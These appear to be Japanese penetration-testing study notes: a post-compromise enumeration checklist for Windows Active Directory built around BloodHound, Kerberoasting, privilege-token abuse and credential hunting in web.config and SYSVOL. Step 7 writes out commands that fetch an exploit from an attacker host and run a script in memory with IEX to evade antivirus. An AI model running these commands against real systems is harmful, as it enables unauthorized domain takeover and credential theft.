# Windows AD 侵入後 列挙チェックリスト

初期シェル（WinRM / SMB / RDP 等）を取得したら、次の権限昇格・横断移動のために以下を確認する。**BloodHound による全体把握が最優先。**

---

## Step 0: システム情報の確認（接続直後に実行）

シェルを取ったら最初に OS のバージョン・ビルド番号・ドメイン所属を確認する。CVE の適用可否や攻撃手法の選択に直結する。

```powershell
# OS バージョン・ビルド番号を詳細に確認（一番確実）
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OSDisplayVersion, WindowsBuildLabEx
# → WindowsProductName: Windows Server 2025 Datacenter
# → OSDisplayVersion: 24H2
# → ビルド番号が古いほどパッチ未適用のCVEが多い可能性

# 簡易確認（出力が少なくて速い）
systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"Domain"
```

**`Get-ComputerInfo` とは何か：** PowerShell の組み込みコマンドレット。OS のバージョン・ビルド番号・Windows エディション・ドメイン所属・ハードウェア情報など、システム全体の情報を一括取得できる。引数なしで実行すると大量の出力が出るため、`Select-Object` で必要な項目に絞ること。

**何が出たら次に何をするか：**

| 観測される出力 | 示唆 | 次のアクション |
|----------------|------|---------------|
| `Windows Server 2025` | 新しいOSで固有のCVEが存在する可能性 | ビルド番号と最新CVEを照合する |
| `WindowsInstallationType: Server Core` | GUIなし。PowerShell操作が前提 | GUI前提のコマンドは使えない |
| `Domain: [ドメイン名]` | ドメイン参加済み | AD環境として Kerberos・LDAP の攻撃手法を検討 |

---

## Step 1: 現在のユーザーの確認（即座に実行）

```powershell
whoami
whoami /all        # 権限・グループ・特権トークンを確認
net user [USERNAME] /domain   # ドメイン上のユーザー情報
```

**着眼点 — 特権トークン（Privileges）の確認：**

| 特権 | 悪用方法 |
|------|---------|
| `SeImpersonatePrivilege` | Potato 系攻撃で SYSTEM に昇格 |
| `SeAssignPrimaryTokenPrivilege` | 同上 |
| `SeBackupPrivilege` | SAM / SYSTEM ハイブの読み取り |
| `SeRestorePrivilege` | 任意ファイルの書き込み |
| `SeMachineAccountPrivilege` | ドメインにコンピューターアカウントを追加可能 → **RBCD 攻撃** |
| `SeEnableDelegationPrivilege` | Unconstrained Delegation を設定可能 |
| `SeDebugPrivilege` | プロセスメモリへのアクセス → LSASS ダンプ |

---

## Step 2: BloodHound でAD全体を把握（最重要）

```bash
# 攻撃側マシン（Linux）から実行
bloodhound-python -u [USER] -p '[PASSWORD]' -ns [DC_IP] -d [DOMAIN] -c All
```

**BloodHound で確認すべき項目：**
1. 「Shortest Paths to Domain Admins」→ 現在のユーザーから Domain Admins への最短ルート
2. 「Find All Domain Admins」→ DA メンバーの把握
3. 「Find Principals with DCSync Rights」→ DCSync が可能なアカウント
4. 現在のユーザー・所属グループが持つ ACE（アクセス制御エントリ）

→ 詳細: `../../05_Tools_Reference/BloodHound.md`

---

## Step 3: グループとメンバーシップの確認

```powershell
# 所属グループの確認
net user [USERNAME] /domain

# Domain Admins のメンバー
net group "Domain Admins" /domain

# 高権限グループの確認
net group "Enterprise Admins" /domain
net group "Account Operators" /domain
net group "Backup Operators" /domain
```

---

## Step 4: コンピューターアカウントの列挙

```bash
# Linux 側から
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --computers
```

**着眼点：** Unconstrained Delegation が設定されたコンピューターを探す。

---

## Step 5: Kerberoastable / ASREPRoastable アカウントの確認

```bash
# Kerberoastable（SPN付きアカウント）
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --kerberoasting output.txt

# ASREPRoastable（事前認証不要アカウント）
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --asreproast output.txt
```

→ 詳細: `Kerberos_Attacks/Kerberoasting.md`, `Kerberos_Attacks/ASREPRoasting.md`

---

## Step 6.5: Webアプリのソースコード確認（IIS環境）

nmap スキャンで 80/443 が開いていた場合、IIS の Web ルートにアプリのソースコードが置かれていることがある。**認証情報・DB接続文字列・ロジックの把握**に使う。

```powershell
# IIS のデフォルト Web ルートを確認
ls C:\inetpub\

# アプリのファイルを確認（app.py、web.config 等）
ls C:\inetpub\[サイト名]\

# web.config に DB 接続文字列・パスワードが埋め込まれていることがある
type C:\inetpub\[サイト名]\web.config

# Python/Flask アプリの場合はメインスクリプトを確認
type C:\inetpub\[サイト名]\app.py
```

**`inetpub` とは何か：** IIS（Internet Information Services、Windows 標準の Web サーバー）のデフォルトルートディレクトリ。`C:\inetpub\wwwroot` がデフォルト公開フォルダだが、複数サイトを運用している場合はサイト名のサブフォルダが作られる。Webアプリが稼働しているサーバーでは必ず確認する。

**着眼点：**
- `web.config` に DB 接続文字列・パスワード・API キーが平文で書かれていることがある
- `app.py` / `*.py` / `*.php` 等のソースからパスワードハッシュのアルゴリズムが判明する（クラックのモード選択に使う）
- アプリの認証ロジックを読むことでバイパス方法が見つかる場合がある

---

## Step 7: Windows PoC の取得・転送・実行（CVE悪用が必要な場合）

CVE の悪用に PoC（概念実証コード）が必要な場合の手順。Linux の場合は `wget` + `make` が基本だが、Windows では転送手段が異なる。

### evil-winrm でのファイルアップロード

evil-winrm には組み込みのファイル転送機能がある。

```bash
# [Kali] evil-winrm 接続時に転送用ディレクトリを指定する
evil-winrm -i [IP] -u [USER] -p '[PASSWORD]' \
  -s /path/to/scripts/   # PowerShellスクリプトを読み込むディレクトリ
```

```powershell
# [evil-winrm シェル内] ローカルファイルをターゲットにアップロード
upload /path/on/kali/exploit.exe C:\Windows\Temp\exploit.exe

# ダウンロード（ターゲットからKaliへ）
download C:\Users\admin\file.txt /path/on/kali/file.txt
```

### PowerShell でのダウンロード（Kali 側で HTTP サーバーを起動）

```bash
# [Kali] HTTP サーバーを起動してファイルを配信
cd /path/to/exploit/
python3 -m http.server 8888
# VPN環境では tun0 の IP を使う: ip addr show tun0
```

```powershell
# [ターゲット] PowerShell でダウンロード
Invoke-WebRequest -Uri "http://[ATTACKER_IP]:8888/exploit.exe" -OutFile "C:\Windows\Temp\exploit.exe"

# または短縮形（エイリアス）
iwr "http://[ATTACKER_IP]:8888/exploit.exe" -OutFile "C:\Windows\Temp\exploit.exe"

# certutil を使う方法（PowerShell が制限されている場合の代替）
certutil -urlcache -f http://[ATTACKER_IP]:8888/exploit.exe C:\Windows\Temp\exploit.exe
```

### PowerShell スクリプト（.ps1）をメモリ上で実行

ファイルを書き込まずにメモリ上で直接実行する手法。アンチウイルスによる検知を回避しやすい。

```powershell
# [ターゲット] スクリプトをメモリ上でダウンロードして実行（IEX）
IEX (Invoke-WebRequest -Uri "http://[ATTACKER_IP]:8888/exploit.ps1" -UseBasicParsing).Content
```

### CVE の調べ方（PoC を探す前に）

```bash
# [Kali] バージョン情報からCVEを検索
searchsploit windows server 2025
searchsploit [技術名] [バージョン]

# GitHub での PoC 検索
# GitHub で "CVE-2025-XXXXX PoC" または "CVE-2025-XXXXX exploit" を検索
# Star数・コミット日時・README の前提条件を確認してから使う
```

→ CVE の絞り込み基準の詳細 → `../../05_Tools_Reference/Searchsploit.md`

**注意点・落とし穴：**
- 実行前に `C:\Windows\Temp` への書き込み権限があるか確認する（`echo test > C:\Windows\Temp\test.txt`）
- PowerShell の実行ポリシーが `Restricted` の場合は `.ps1` を直接実行できない。`IEX` 経由か `powershell -ExecutionPolicy Bypass -File exploit.ps1` で回避
- GitHub から落とした PoC は README で**前提条件**（OS バージョン・権限・必要なグループ）を必ず確認してから実行する
- Windows Server 2025 / 2022 には新しいセキュリティ機構（Windows Defender・AMSI 等）が有効なことが多い。エラーが出た場合はアンチウイルス回避を検討する

---

## Step 6: SYSVOL / NETLOGON の確認

```bash
smbclient //[IP]/SYSVOL -U '[DOMAIN]\[USER]%[PASSWORD]' -c "recurse ON; ls"
```

認証済みユーザーとして SYSVOL にアクセスし、スクリプトに他ユーザーの認証情報が含まれていないか確認する。

---

## 関連技術
- 前：WinRM シェルの取得 → `../../02_Initial_Access/Protocol_Exploitation.md`（WinRMセクション）
- 後：BloodHound で ACE が判明 → `ACE_Abuse/` 配下の該当ファイル
- 後：SeMachineAccountPrivilege がある → `Delegation_Attacks/RBCD.md`
- 後：SeEnableDelegationPrivilege がある → `Delegation_Attacks/Unconstrained.md`
- 後：Kerberoastable アカウントがある → `Kerberos_Attacks/Kerberoasting.md`
- CVE の絞り込み・PoC の探し方 → `../../05_Tools_Reference/Searchsploit.md`
